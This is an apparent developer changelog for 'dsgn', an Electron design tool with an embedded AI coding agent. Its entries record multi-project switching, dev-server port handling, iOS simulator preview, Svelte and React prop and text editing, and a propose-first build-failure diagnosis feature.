- **`App.tsx` `evictWarm`** (was `evictWarmServers`) — beyond the N most-recent
  projects, suspend the LRU ones by stopping the dev server **and** closing the
  agent session. Never reaps the active project, a simulator, or a project whose
  agent is mid-turn (`useChat.isRunningFor` — sticky from submit until `done`, so it
  protects backgrounded in-flight turns too). Re-reads live `activeKey`/running
  right before the destructive stops to dodge a switch-back TOCTOU.
- **`App.tsx` `applyProject`** — on switch-back, if `agent.isOpen` is false the
  session was LRU-suspended, so it's reopened via `agent.openProject` (awaited +
  try/catch, with a clear "prior context cleared" log note — the reopened session
  starts fresh; the visible transcript is kept for reference). Otherwise just
  `setActive`. Mirrors the dead/suspended dev-server relaunch path.
- Tradeoff (documented): suspending closes the SDK subprocess, so an evicted
  project's *agent context* is lost (its chat transcript is preserved for display).
  Real resume lands with v5-D (session persistence).
- Test: `test/agent-cap.mjs` — is-open liveness, LRU suspend leaves peers open,
  reopen re-activates. Full `bun run verify` green (31 OK, agent-e2e/sim-e2e SKIP
  without creds/Xcode).

## 2026-06-26 — proactive checks C1/C3: error extraction + rule-based diagnosis

- Real-world driver: an Expo build failed and dsgn surfaced the xcodebuild
  *dependency-graph* dump, not the actual cause — a stale Homebrew node keg pinned
  in `ios/.xcode.env.local` (`dyld: Library not loaded … Abort trap: 6`). Fixed the
  project (repoint NODE_BINARY) and hardened dsgn so it catches this class itself.
- **`extractBuildError(log)`** in `src/main/xcode.ts` (pure): pulls high-signal
  lines (dyld / Abort trap / PhaseScriptExecution / `error:` / linker) out of a
  build log and drops the "Explicit dependency on target …" graph noise. Wired into
  both `spawnMetro` reject paths (build-fail + early-exit); tail buffer 4k→8k.
- **`src/main/diag-rules.ts`** — layer 2 of the proactive-checks plan: pure
  `matchKnownError(text)` maps known signatures → known fixes (instant, offline)
  *before* the AI. First rule: broken NODE_BINARY → repo-scoped fix (rewrite
  `.xcode.env.local`) + optional host `brew cleanup node`. Wired into `diagnose:run`
  between the recall-cache and `aiDiagnose`; renders through the same DiagnoseCard.
- Tests: `extractBuildError` cases in `test/xcode.mjs`; new bun `test/diag-rules.mjs`
  (matches the node failure, no false positives on unrelated dyld/unknown errors).
  Added to the test/verify chains. Full verify green; `SIM-PREFLIGHT ok=true` now
  that the 26.5 runtime is installed.

## 2026-06-26 — v5-C rail: multiple open projects + switching (the payoff)

- **dsgn is now multi-project.** A left sidebar (`Rail.tsx`, Cursor-style) lists
  the open repos with an active highlight, a per-project "working" dot (green when
  that project's agent turn is in flight — incl. backgrounded ones), an × to close,
  and "+ New project" which opens another **keeping the current one warm** (its dev
  server + agent session keep running for an instant switch). The rail only shows
  once a project is open (single-project keeps the old layout).
- `ProjectEntry` now carries a per-project display snapshot (url / previewKind /
  branch / launchSpec); `patchEntry` updates it. `attempt(root, cmd?, keepWarm)`
  skips the single-active teardown when keeping warm and snapshots the project it
  leaves. `switchTo`/`applyProject` swap the preview (navigate the one
  WebContentsView to the target URL), the active agent session (`agent:setActive`),
  the per-project chat (`useChat.setActiveChat`), tokens, annotations, branch,
  status — no restart. `closeProjectFromRail` stops the server + session and falls
  through to another open project (or idle).
- New `test/rail.mjs`: open two fixtures (second keeps the first warm), assert both
  servers stay reachable, switching swaps the preview port + the per-project chat
  slice. Screenshot `10-rail.png`. Full verify green.
- Adversarial review (10 findings) hardened it: switching a warm project whose dev
  server **died/was suspended** now probes (`devServer.isRunning`) and relaunches it
  before navigating (no dead frame); `applyProject` clears the outgoing tokens/pins
  up front and guards the annotations write against a rapid re-switch (+ a
  `stillActive` re-check after every await); **LRU-suspend** caps warm dev servers at
  3 (the decided behavior — beyond that the least-recently-used are stopped and
  relaunch on return); project entries are kept current (open/restart/branch-rename
  patch them) so switching needs no stale-closure snapshot; `closeProjectFromRail`
  awaits the session close before clearing chat and avoids a double-stop on the last
  project; test isolation assertion strengthened (content, not counts).

## 2026-06-26 — v5-C core: per-project chat + event routing (keep-running)

- The machinery behind the chosen "backgrounded agents keep running, badge on
  return" behavior. `agent.ts` `emit` now tags every event with its session's
  `projectKey` and emits for ALL live sessions (dropped the active-only guard);
  new `agent:set-active(root)` switches a warm session without recreating it.
- `useChat` is now per-project: `byKey[projectKey]` slices (messages + isRunning +
  the streaming message id moved into the slice), with the active slice mirrored
  into the top-level `messages`/`isRunning` so ChatPanel + the Playwright store
  harness read it **unchanged**. Chat actions take an optional key (default =
  active); ChatPanel's `agent:event` handler routes by `event.projectKey` — the
  active project streams live, a backgrounded project accumulates into its own
  slice (the rail's "working" dot) and its output is there on switch-back.
- App sets the active chat to the open project, clears a project's slice on
  close/switch-away. New `test/chat-route.mjs` injects `agent:event`s from main
  (no creds) and proves routing + background accumulation + switch-reveal. Full
  verify green; `chat-render`/`comment-mode`/`agent-multi` unchanged. Rail UI next.
- Review fixes: `patch` uses `?? activeKey` (an explicit `''` is its own slice, not
  collapsed into the active project); open clears the project's chat slice first
  (so a trailing event from a disposed session can't surface stale content on
  reopen) and `stop` awaits `closeProject` before clearing.

## 2026-06-25 — v5-B: one agent session per project (S8)

- `src/main/agent.ts`: replaced the single `session` + monotonic `currentEpoch`
  with a `Map<projectKey, Session>` plus an `activeKey`. Each open project keeps
  its own persistent `query()` session (cwd = its repo); only the **active**
  project's session streams to the renderer (`emit` guards on
  `!disposed && key === activeKey`), so a backgrounded session kept warm for a
  fast switch can't leak into the visible chat. `permCounter` moved per-session and
  its fallback ids are namespaced by project key (no cross-session collisions).
- `agent:open-project` creates/replaces+activates a session for its key;
  `send`/`setModel`/`setPermissionMode`/`respond-permission`/`interrupt` route to
  the active session; `before-quit` closes all. New `agent:close-project` (+
  `DsgnApi.agent.closeProject`) tears a project's session down; the renderer calls
  it in the single-active teardown (switching), the failed-open cleanup, and stop.
- New `test/agent-multi.mjs` proves the lifecycle without Claude creds — it probes
  the synchronous "no active session" error to verify per-project sessions, active
  routing, and close semantics (open A,B → active; close the active → cleared, NOT
  auto-promoted; reopen re-activates; close last → none). Full verify green;
  single-project agent path unchanged.
- Review fix: closing the active project clears `activeKey` (it never auto-promotes
  a backgrounded session — which would start emitting into a chat the renderer
  isn't showing once the rail keeps sessions warm); the renderer re-activates
  explicitly via open-project.

## 2026-06-25 — v5-A: multi-instance dev servers (S7)

- `src/main/devserver.ts`: replaced the single `current` ChildProcess with a
  `Map<projectKey, ChildProcess>` — several projects' dev servers run at once.
  `start(opts.root)` pre-empts only that project's prior server (restart) and
  leaves others; `stop(root)` kills one process group + deletes its entry;
  `stopAll()` on `before-quit`; the spawn registers an `exit` handler that prunes
  the map if a server dies on its own. The timeout targets only the timed-out root.
- Contract: `devserver:stop` + `DsgnApi.devServer.stop` gain a `root`; preload +
  the three App callers thread it. Single-active behavior is preserved at the
  renderer (opening another project stops the previous one and drops it from the
  workspace; the rail will skip that to keep projects warm). Running servers hold
  their ports, so `findFreePort` hands out distinct ones naturally.
- New `test/devserver-multi.mjs`: two fixtures' servers run concurrently on
  distinct ports, both reachable, and `stop(rootA)` leaves B running. Full verify
  green (open-preview / setup-restart single-project paths unchanged).
- Adversarial review caught a real **free-port race** (concurrent starts both
  probed 7777 → same port): added a serialized `allocatePort` + reserved-port set
  so concurrent starts get distinct ports (released on exit). Also: the 90s
  timeout now kills the *captured* child (identity-guarded), not whatever's in the
  map for that key (a restart could otherwise kill the newer server); a failed
  `attempt` stops the dev server it started (no orphan); the test was strengthened
  (both fixtures honor `PORT` so the allocator is actually under test) and polls
  until-down instead of a fixed sleep.

## 2026-06-25 — iOS simulator build-destination preflight (the 26.5 gap)

- Root cause of "iOS 26.5 is not installed" after a multi-minute build: modern
  Xcode couples a simulator *build* to a runtime ≥ its active SDK version. The old
  preflight only counted `simctl` devices, which still listed 26.0/26.1 devices,
  so it went green while the build was already doomed.
- **`simBuildDestination(sdkVersion, runtimeVersions)`** in `src/main/xcode.ts`
  (pure, with `parseVersion`/`cmpVersion`): fails when no installed runtime ≥ the
  SDK, handing back the one-line fix (`xcodebuild -downloadPlatform iOS`). Unknown/
  unparseable SDK never blocks (degrade safe). Unit-tested in `test/xcode.mjs`.
- `preflight()` now probes `xcrun --sdk iphonesimulator --show-sdk-version` and the
  runtime versions, and returns this reason *before* booting + building.
- Kicked off the 8.52 GB `xcodebuild -downloadPlatform iOS` for this machine's
  missing 26.5 runtime (consented).
- **`docs/PLAN-proactive-checks.md`** — the layered "preflight rules" design this
  generalizes into: proactive checks → rule-based failure matching → AI diagnose
  fallback, all feeding the existing propose-first card + per-machine memory.

## 2026-06-25 — v5 foundation: projectKey + workspace store (S0/S2)

- First, non-collision slices of the v5 multi-project roadmap (a planning workflow
  mapped the single-instance machinery and ordered the slices to avoid the parallel
  session's main-process edits — see `docs/TASKS.md` v5).
- **S0** — `src/shared/projectKey.ts`: a pure, string-only canonical key for an open
  project (separator/trailing-slash normalized, idempotent). Every later
  `Map<root,*>` (dev servers, agent sessions, preview state, the renderer
  workspace) keys on this so main and renderer dedupe the same repo. Pure bun test
  `test/project-key.mjs`.
- **S2** — `useWorkspace` store (renderer): the future source of truth for
  multi-project — `projects[]` + `activeKey`, with `openOrActivate/activate/close`
  keyed by `projectKey`. Wired live for the single open project (App populates it on
  open, clears on stop) but otherwise additive/dormant until the rail + multi-instance
  backends land. Exercised in `test/chat-render.mjs` (`__dsgnWorkspace`).
- Deferred + why: the multi-instance **main** refactors (dev servers S7, agent
  sessions S8, preview state S9) are HIGH-collision with the parallel session's
  active `main/index.ts`/`agent.ts`/`devserver.ts` work and gated on lifecycle
  decisions (warm vs suspend, caps) — left for coordination. The per-project store
  fan-out (S3–S6) is a large dormant renderer refactor better done with the user in
  the loop. See the session's blocking questions.

## 2026-06-25 — Figma-style inline comment (C) + annotation (Y) modes

- Press **C** → comment mode, **Y** → annotation mode (also toolbar buttons). Click
  an element in the preview and an inline composer (a pill in the overlay's shadow
  root) anchors to it. Submitting a **comment** sends it straight to the agent
  (element ref + your text); an **annotation** pins a note (no agent), reusing the
  existing `.dsgn/annotations.json` engine + pins.
- Layered onto the existing select overlay in `src/preview/preload.ts` (select
  stays byte-identical): a `commentMode` state, the shadow-DOM composer, capture-
  phase C/Y/Esc keys (guarded against the page's own text fields + modifiers), and
  click→`openComposer`→submit. Modes are mutually exclusive with select. New
  channels: `set-comment-mode` (renderer→preload), `comment-mode` (keyboard echo),
  `comment` (submit) — all sender-gated in main and cached across preview reloads.
- Renderer: `useSelection.commentMode` mirrors the preview (toolbar reflects
  keyboard arming); a submitted comment routes via a new one-shot `useComposer.submit`
  (auto-sends, or prefills if a turn is running so it's never dropped); an
  annotation calls `annotations.add`. Comment text is capped/sanitized into the
  prompt. New `test/comment-mode.mjs` drives the full path end to end (arm → click
  → shadow composer → send → agent turn / annotation pin) through real IPC.
- Adversarial review fixes: the composer self-heals if its frozen element is
  removed by HMR (`isConnected` guard in `onMove`, mirroring the text-edit path);
  `preview:reset` clears `commentModeActive` for parity with `selectModeActive` (no
  stale re-arm on project switch); and an annotation submitted before the session
  is ready logs feedback instead of dropping silently.

## 2026-06-25 — AI diagnose-on-failure → propose-first fix card + per-machine memory

- When opening/launching a project fails (web or simulator — both throw into the
  one `attempt` catch), dsgn now asks the agent to **diagnose** it and shows a
  **propose-first** card: a one-line root cause + numbered steps, each tagged
  **repo** (a fix dsgn can apply) or **host** (sudo / global / download — the user
  runs it), with the exact shell command + a Copy button. Nothing runs
  automatically (user-chosen). "Apply repo fix" seeds the chat with the repo steps
  for the agent to execute (reviewed + sent); host steps are copy-only.
- **Per-machine memory** (user-chosen scope): `src/main/diag-cache.ts` (pure, fs)
  caches each diagnosis in the app's userData (NOT the repo), keyed by project path
  + a normalized error **signature** (paths/ids/numbers stripped, so the same error
  class recalls instantly across runs). A repeat error is recalled with "seen before"
  — no model call. `diagnose:record` stores applied/dismissed.
- **One-shot, tool-less SDK turn** (`src/main/diagnose.ts`): cwd=repo, no tools, no
  settings, asks for a strict JSON plan; degrades to null without auth (the raw
  error still shows). Recall happens before any model call.
- Tests: `test/diag-cache.mjs` (signature normalization incl. the module-name-vs-path
  fix, recall/remember, per-project, status) + `test/diagnose-card.mjs` (renders
  repo/host steps, Apply seeds the composer + clears, Dismiss clears). `bun run
  verify` green (25 checks).

## 2026-06-25 — Svelte component prop schema reachable via selection (option D)

- Bug: selecting a rendered Svelte component never showed its prop schema. A
  Svelte component instance compiles to **no DOM node**, so the usage-site
  `data-dsgn-source` stamp on `<Accordion>` is dropped (no `...rest` forwarding) —
  the only stamps reaching the page are the plain host elements *inside each
  component's definition*, which took the host-element (no-schema) path.
- Fix (**option D — same-file definition schema**): when a clicked host element
  resolves into a `.svelte` file that declares props, `inspectSvelteProps` now
  surfaces **that file's own** props (`extractProps` on the same instance script).
  Works for **every component shape** (block-`{#if}`-root, multi-root, etc.) with
  **zero source mutation** — chosen over rest-forwarding (A/B), which can't reach
  the ~46% of a real library that has no single host root. Per-instance editing
  (option C, runtime instance→usage mapping) is the planned follow-up.
- Edits to a definition-scoped prop route to the agent as a prop-default change
  (the instance has no node to splice). The panel surfaces the schema only — no
  misleading live value — and the note is honest ("no per-instance value; editing
  changes the default, affecting only instances that don't set it"). SvelteKit
  route files (`+page`/`+layout`) are excluded (their `data`/`form`/`params` are
  framework-injected, not props). New `test/prop-svelte-self.mjs` (the brief's
  smoke check): definition host → `hasSchema:true` with the right fields, edit →
  agent, plus propless-host and route-file negatives; cross-file path intact.

## 2026-06-25 — Work on a `dsgn/*` branch per project

- Opening a project now puts dsgn's work on a **`dsgn/*` branch** so the user's main
  branch stays clean. `src/main/git.ts` (pure, child_process only): `ensureBranch`
  keeps an existing `dsgn/*` branch or creates `dsgn/<current-branch>` off HEAD
  (`dsgn/work` when detached); `switchBranch` switches/creates a named one
  (coerced to a git-ref-safe `dsgn/<…>`). `checkout -b` carries uncommitted changes
  (nothing lost); a conflicting switch surfaces the error instead of forcing.
- **Only manages the repo TOP LEVEL** (`isRepoRoot`, realpath-compared) — opening a
  subdirectory of a larger repo (a monorepo package, or a fixture inside this repo)
  is a no-op, so the test suite never switches dsgn's own branch.
- The branch shows as a **clickable pill in the titlebar** (`⎇ dsgn/main`); clicking
  opens an inline editor to rename/switch (Enter applies, Esc cancels). The open flow
  logs `Working on branch … (created)` to the activity console.
- `git:ensure`/`git:set` IPC; `useSession.branch`; `BranchResult` contract. Unit test
  `test/git.mjs` (real temp repo: normalize, non-repo no-op, ensure create/keep,
  switch create/existing); chat-render covers the pill + inline editor. `bun run
  verify` green (22 checks); confirmed the suite leaves dsgn on `main`.

## 2026-06-25 — React Native / iOS-Simulator preview (Phase 1: live mirror)

- New preview mode: a booted **iOS Simulator** running an Expo/React Native app
  shown in the right pane instead of a web browser (macOS-only). Phase 1 of a
  phased plan (mirror → interact → element-select); user-chosen scope: RN/Expo
  first, macOS-only, start with a view-only mirror.
- **Frame transport — reuse over reinvention.** Rather than a new renderer canvas
  fed frames over IPC, `src/main/simulator.ts` stands up a tiny local **"sim
  bridge"**: an HTTP server that captures the booted device (`xcrun simctl io …
  screenshot`, JPEG) and serves it as an **MJPEG** behind a one-`<img>` page. The
  renderer points the **existing** preview `WebContentsView` at that URL — so the
  simulator is "just another local URL" and every geometry/load/retry seam
  (`preview:set-bounds`, `preview:load`, the `did-fail-load` retry loop) is reused
  unchanged. Modeled on `serve-sim` (Evan Bacon) and Maestro Studio.
- **Detection** (`devserver.ts`): `detectFramework` recognizes `expo` /
  `react-native` (checked first — Expo repos also list `react-native`); `detect()`
  sets `previewKind: 'web' | 'simulator'` on `DetectedProject`. Frame capture uses
  only `xcrun simctl` (ships with Xcode, zero extra install); `idb` is detected for
  the Phase-2 interaction path but not required.
- **Preflight** (`simulator.preflight()`): all read-only `execFile` probes, never
  throws; returns a human `reason` per failure class (not-macOS / no-Xcode /
  no-runtime / no-device). `App.attempt()` branches on `previewKind`, preflights
  first, and surfaces a clean banner+console card off the happy path instead of
  crashing. Backend teardown is cross-routed (opening a web project stops any
  simulator and vice-versa); `stop()`/`restartPreview()` route by `previewKind`.
- **Lifecycle** (`simulator.start`): boot a device (prefer already-booted, else
  newest iPhone) → `bootstatus` wait → spawn the dev command (default `expo
  run:ios`: build+install+launch+serve) in its own process group → stand up the
  bridge → readiness = first captured frame. `stop()` SIGTERMs the Metro group and
  closes the bridge (sim left booted for fast re-open); `before-quit` cleanup.
- **Preload routing**: the bridge page is flagged `?dsgnSim=1`; `src/preview/
  preload.ts` early-returns its whole web overlay there (no previewed-app DOM to
  stamp/inspect). The "Select" toggle is hidden in sim mode until Phase 3.
- **Contract** (`src/shared/api.ts`): `Framework` += `expo`/`react-native`;
  `PreviewKind`; `DetectedProject.previewKind`; `RunningSimulator`; `SimPreflight`;
  `SetupStrategy` += `babel-plugin-rn` (Phase 3); `DsgnApi.simulator.{preflight,
  start,stop,onLog}` mirrored in the preload.
- **Tests (degrade off-macOS, like agent-e2e):** `sim-detect` (expo/RN→simulator,
  vite→web), `sim-preflight` (non-mac → ok:false + reason), `sim-frame` (exercises
  the whole bridge→MJPEG→WebContentsView transport with a stub frame source via a
  main-process test hook — **no simulator needed**), `sim-e2e` (boots a real sim;
  SKIPs unless macOS + `DSGN_SIM_E2E=1` + `DSGN_SIM_FIXTURE`). `bun run verify`
  green (19 checks; agent-e2e + sim-e2e SKIP here).
- **Not yet verified on-device:** the simctl/expo orchestration in `start()` is
  macOS-only and could not run in this Linux CI env — it needs a Mac with Xcode to
  confirm boot/build/launch end-to-end (the bridge/transport itself IS verified by
  `sim-frame`).

## 2026-06-24 — First-run offer to scaffold `.dsgn/tokens.json`

- When a project opens with **no** design tokens (`tokens.detect` → `source:'none'`
  — no manifest, Tailwind theme, or CSS custom properties), dsgn now offers a
  starter `.dsgn/tokens.json` (colors/spacing/radius/fontSize). Accepting is a
  deterministic file write (no agent turn); the manifest then becomes the
  editable, canonical source the palette reads.
- `scaffoldManifest` (tokens.ts, `tokens:scaffold`) only writes when the project
  has **zero** tokens — it never shadows a live Tailwind/CSS source or clobbers an
  existing manifest (guarded on `detectTokens(...).source === 'none'`, idempotent).
- New `TokenOfferCard`; the offer yields to the setup offer (one card at a time).
  Offer state lives on `useTokens` (`offerNeeded`/`offerDismissed`/`scaffolding`,
  cleared on project switch via `reset()`). New `test/tokens-scaffold.mjs` covers
  the write, idempotency, no-shadow/no-clobber, and the card's accept + dismiss.
- Adversarial review fix: `acceptTokenScaffold` re-checks `projectRoot` after the
  async write resolves (mirrors the detect handler) so switching projects mid-write
  can't stamp the old project's starter palette into the new project's state.

## 2026-06-24 — Svelte inline text-splice in source

- Inline text editing rewrote JSX text directly but punted `.svelte` to the agent.
  Now `applySvelteTextEdit` (props-svelte.ts) splices Svelte text content via
  svelte/compiler — the `.svelte` counterpart of the JSX path, same contract:
  plain-`Text` children + splice-safe new text apply directly; empty / expression
  (`{...}`) / mixed / element children fall back to the agent.
- Mirrors the JSX engine's whitespace handling (lead/trail from the raw source,
  zeroed for all-whitespace) and splice-safety regex (`^[^<>{}]*$`, so the new
  text can't open a tag or mustache). Reuses the shared `findElement` /
  `makeLocator` so line/col match the stamps.
- `props.ts` dispatches `.svelte` to it (was a hard agent-fallback). New
  `test/text-edit-svelte.mjs`: plain `<h1>` text rewritten to `.svelte` source;
  a mixed `<p>Label <Badge/></p>` correctly needs the agent.

## 2026-06-24 — Auto-restart the preview after setup

- A setup turn edits the build config (vite.config / svelte.config), which
  Vite/SvelteKit only read at boot — a page reload alone never applied the new
  source-stamping plugin, so the user had to manually restart. Now dsgn does it.
- `useSetup.busy` already uniquely marks "the setup turn is in progress" (only
  `acceptSetup` sets it), so verification is now armed when that turn **finishes**
  (the `done` handler), not when it's dispatched — closing a race where a
  mid-turn dev-server auto-restart could be mistaken for the verdict.
- On setup `done`: arm `verifying` + raise a one-shot `restartRequested`. App
  consumes it and `restartPreview()` does `devServer.stop()` → `start()` (reusing
  the captured launch spec: root + resolved dev command + framework) →
  `preview.load(newUrl)`. The post-restart readiness report is the verdict. Only
  restarts servers dsgn owns (skips attached). On relaunch failure (a broken
  config edit) it disarms verification and surfaces the error instead of hanging.
- New `test/setup-restart.mjs`: opens a fixture, drives the finished-setup signal,
  asserts the server relaunches, the preview reloads, and the zero-stamp verdict
  fires (no silent success). Also backfilled `verify` to run the setup tests.
- Adversarial review (3 dimensions, independently verified) caught and fixed:
  cancelling a setup turn no longer restarts (an interrupt arrives as `done` with
  `busy` still set — `stop()` now clears it); a project switch mid-restart is
  guarded (re-checks `projectRoot` after each await so it won't relaunch the old
  project over the new one); and an attached (user-owned) server now reports
  "restart it yourself" instead of a false zero-stamp verdict.

## 2026-06-24 — Framework-aware setup (detect before generating)

- Fixed the core setup bug: dsgn assumed React and wrote a Babel JSX plugin
  (`dsgn-source-plugin.cjs`) to the repo **root** of any project — useless in a
  SvelteKit repo (no Babel pass, no JSX) and it would have reported success
  anyway. Setup is now **framework-first**.
- `src/main/setup.ts` `detect()` reads `package.json` deps **first** and branches:
  `@sveltejs/kit`/`svelte` → Svelte (markup-preprocessor strategy, with
  `svelteMajor`), `react`/`@vitejs/plugin-react(-swc)`/`next` → React (Babel
  plugin), `solid-js` → Solid (Babel — also JSX), `vue` → Vue (inspector
  strategy, **no bespoke file** — reuse its ecosystem), else `unknown` → none.
- Artifacts are **scoped to `.dsgn/`** (not the repo root): `.dsgn/dsgn-source.cjs`
  (React/Solid) or `.dsgn/dsgn-svelte-stamp.mjs` (Svelte preprocessor using
  `svelte/compiler`, 1-based line / 0-based col to match `props-svelte.ts`). Both
  are **structurally dev-gated** (`NODE_ENV === 'production'` → empty visitor /
  no-op), idempotent, and removable via a new `setup:uninstall` (also sweeps the
  legacy root plugin).
- `acceptSetup` now builds **framework-correct** agent instructions (React
  `interface Props`, Svelte 5 `$props()` vs Svelte 4 `export let`, Vue
  `defineProps<Props>()`) and **stops with a clear message** for unknown/Vue
  rather than handing React steps to a non-React repo.
- **Verification (no silent success):** `acceptSetup` arms `verifying`; the next
  readiness report confirms stamps fired — `>0` → "Setup verified", `0` → a hard
  warning that the instrumentation didn't fire.
- New `test/setup-detect.mjs`: per-framework detect/scaffold/uninstall, idempotency,
  dev-gating, legacy-cleanup — through real IPC. `ready-gating.mjs` updated to the
  `.dsgn/` path. `SetupResult` reshaped (`framework: Frontend`, `strategy`,
  `svelteMajor`, `files[]`; dropped `pluginFile`).

## 2026-06-24 — Preview runs on its own free port (7777+), bound to 127.0.0.1

- dsgn now **always spawns the dev server on a free port it picks** (first free at/above
  7777) **bound to 127.0.0.1**, via `--port/--host` flags (vite/sveltekit/next) or
  `PORT`/`HOST` env (CRA/unknown). This kills the framework-default collisions
  (5173/3000), the IPv4/IPv6 `localhost` mismatch, and the attach-to-a-stale-server
  confusion in one move — the attach-on-open probe is dropped (always a fresh,
  isolated server).
- **Not 6666:** the IRC ports (6665-6669, 6679, 6697) are on the browser/WHATWG-fetch
  blocked-ports list, so Chromium AND the Node `fetch` readiness probe refuse them —
  a preview there can't load even though the server binds (curl works, which masked it).
  `findFreePort` skips the whole blocked-ports list; base is 7777.
- Readiness now probes the assigned port directly (primary) with the printed-URL parse
  as fallback. `findFreePort`/`isPortFree`/`BLOCKED_PORTS` unit-tested; open-preview
  asserts the preview lands on a port ≥ 7777. `bun run verify` green (13 tests).

## 2026-06-24 — Stop the in-flight agent turn + setup streams progress

- A **Stop** affordance interrupts the running agent turn (`agent.interrupt()` → the
  SDK emits `result`→`done`, clearing `isRunning` and any setup `busy`).
- The on-open **Setup** card now streams its agent turn into the chat (so you can
  watch and stop it) and is guarded: `busy` stays true until the turn finishes
  (cleared by the `done`/`error` handler), a scaffold failure clears `busy`, and
  it won't re-trigger while a turn is running. `verify` green (13 tests).

## 2026-06-24 — Inline text editing

- **Double-click a stamped, text-only element in the preview** (in Select mode) to edit its
  text in place; Enter/blur writes the new text straight to source, Escape cancels.
- Engine (`applyTextEdit` in `props.ts`): finds the JSX element at the stamp, and when its
  children are plain text (a single JSXText, or empty) and the new text is splice-safe
  (`/^[^<>{}]*$/`), rewrites the text child in source preserving leading/trailing whitespace.
  Expression/mixed content (`{title}`, nested elements), self-closing elements, or `.svelte`
  files fall back to the agent (`needsAgent`).
- Wiring: the preview preload drives the inline `contentEditable` edit and emits the commit;
  main relays it (sender-checked) to the renderer, which applies via `text:apply` with the
  current project root (agent-seeds on `needsAgent`).
- `test/text-edit.mjs`: a plain-text `<h1>` is rewritten in source; an expression child
  (`{props.label}`) → agent. ✅ `bun run verify` green.
- **Adversarial review (5 findings, all fixed):** the `editing` flag could strand select mode —
  now `setActive(false)` and `pagehide` end the edit, and a detached node self-heals on the next
  mouse move (HMR mid-edit); a write failure now routes the edit to the agent instead of being
  silently dropped; surrounding whitespace is derived from the raw source (so `&nbsp;` etc. aren't
  rewritten as literal bytes) with the all-whitespace overlap zeroed.

## 2026-06-24 — Activity console (visibility into the open-project flow)

- A collapsible **Activity console** (titlebar "Logs" toggle) shows the whole open
  sequence with timestamps: detect result, attach-vs-spawn decision, raw dev-server
  output, readiness, preview load, agent session start, Ready — and any error
  (errors auto-open it). Docked full-width above the panes; the native preview
  reflows via its ResizeObserver. `useLog` store (capped at 500 lines) +
  `ConsolePanel.tsx`; `App.attempt` emits the step lines, `devserver:log` feeds the
  raw output. Also strips the ANSI codes (so the URL line reads cleanly). This is
  the trail that would've made the lkmv.ch hang obvious at a glance.
- Gave the "Open project" button a `btn--open` class — adding the "Logs" `btn` made
  `.btn` ambiguous and broke the tests' open-click. open-preview now also asserts the
  console captured Detected/Dev server/Preview loaded/Ready. `bun run verify` green (12 tests).

## 2026-06-23 — Readiness gating, floating prop panel, on-open setup

A project that isn't dsgn-ready no longer pretends to be editable — and dsgn offers to fix it.

- **Gating**: prop editing is now gated on a resolved react-docgen schema (`PropInspection.hasSchema`).
  Selecting an element auto-inspects (App effect, race-guarded by source); a schema-backed
  component opens the editor, an unready one (host element / untyped / unstamped) shows a
  prompt-only hint with a "set up the project" link.
- **Floating prop panel** (`PropPanel.tsx`): the editor moved out of the chat to a panel on the
  preview's right edge — component name, source, and every prop with a typed control + its
  description. Because the preview is a *native* view (DOM can't float above it), the panel
  reserves a right-edge strip via `preview.setPanelInset` and the native bounds shrink while
  it's open.
- **On-open setup** (`SetupCard` + `src/main/setup.ts`): the preview preload reports whether
  the app is source-stamped; if not, dsgn posts a chat offer to set it up. Accept → dsgn writes
  the dev-only stamping Babel plugin deterministically, then asks the agent to wire it in and
  type the components (the hybrid).
- New `test/ready-gating.mjs`: scaffold writes the plugin (idempotent), a no-schema element is
  prompt-only (no panel), a schema-backed one opens the panel, and the offer renders.
  ✅ `bun run verify` green (10 tests).
- **Adversarial review (4 findings, all fixed):** dismissing the offer no longer blanks the
  chat (dismiss clears `needed`); the readiness probe re-samples (600/1500/3000ms) so a slow
  SPA isn't falsely flagged; `acceptSetup` is try/finally so busy can't stick; the gating test
  now also asserts the positive panel case. No safety issues in the scaffold or preview-bounds.

## 2026-06-23 — Dev-server: attach-to-running + IPv4/IPv6-safe preview

Fixes "opening a project I already run doesn't work" (hit on lkmv.ch):

- **Attach instead of duplicate.** If the project's dev server is already serving
  (probe the known framework's default port — Vite/SvelteKit 5173, Next/CRA 3000 —
  on both 127.0.0.1 and [::1], require status < 400), dsgn previews THAT instead of
  spawning a competitor. Two dev servers on one project clash (e.g. SvelteKit's
  `.svelte-kit/`) and the duplicate 500s. Only known frameworks attach; 'unknown'
  always spawns (so it never grabs an unrelated app on 5173/3000). Attached servers
  aren't owned, so Stop/quit won't kill them.
- **IPv4/IPv6-safe URLs.** A spawned `vite dev` often binds IPv6-only (`[::1]`) while
  the preview resolves `localhost` to IPv4 (`127.0.0.1`) → blank preview. The runner
  now resolves the printed URL to whichever concrete loopback actually answers and
  loads that.
- **Moved dsgn's own renderer off 5173** (→ 5180) so it stops colliding with every
  Vite/SvelteKit project's default port.
- Extracted pure helpers to `src/main/devserver-net.ts` with a unit test
  (`test/devserver-net.mjs`): host variants, attach policy (unknown → no probe,
  500 → don't attach, IPv6 fallback). `bun run verify` green (11 tests; open-preview
  now serves over 127.0.0.1). Updated tests that hardcoded `localhost`.

## 2026-06-23 — Svelte / SvelteKit support (prop editing → framework-agnostic)

- Prop editing is now **framework-agnostic by dispatch**: `props.ts` routes by
  source extension — `.svelte` → new `src/main/props-svelte.ts`, everything else →
  the unchanged React/JSX engine. Both share helpers (resolveSource, mergeFields,
  withinRoot, isValidAttrName) and return identical PropInspection/PropEditResult.
- `props-svelte.ts` parses with `svelte/compiler` (ESM, dynamic-imported): finds
  the element at line:col, reads literal attributes, resolves a component schema
  cross-file from `export let` (Svelte 4) or `$props()` + `interface Props` (Svelte 5),
  and applies literal edits by splicing the `.svelte` source.
- Added a **Svelte stamping recipe** to `docs/DESIGN.md`. Test
  `test/prop-edit-svelte.mjs` (svelte-app fixture) covers the cross-file `$props` schema,
  literal apply, host attrs, and same-line/column disambiguation.
- **Adversarial review (1 real bug, fixed):** `resolveSource`'s greedy regex parsed
  `"path:line:col"` as `file="path:line", line=col` — a latent bug on the shared path.
  Now non-greedy; plus a defense-in-depth attr-name re-validation in `applySvelteEdit`.

## 2026-06-23 — Design-token detection + palette

- `src/main/tokens.ts` auto-detects a project's design tokens, probing three sources in
  priority order so the right one is chosen per repo: **`.dsgn/tokens.json`** manifest →
  **`tailwind.config.*`** (parsed *statically* with babel — literal theme values only, the
  config is never executed) → **CSS custom properties** (a depth/file-bounded scan of the
  repo's CSS, grouped by name prefix). First source with tokens wins.
- Renderer: tokens load on project open into `useTokens`; the inspector gains a "Tokens"
  toggle showing the detected palette (swatches for colors, the source labeled). Clicking a
  token seeds the chat to apply it to the selected element — reusing the agent path rather
  than a fragile per-framework style editor.
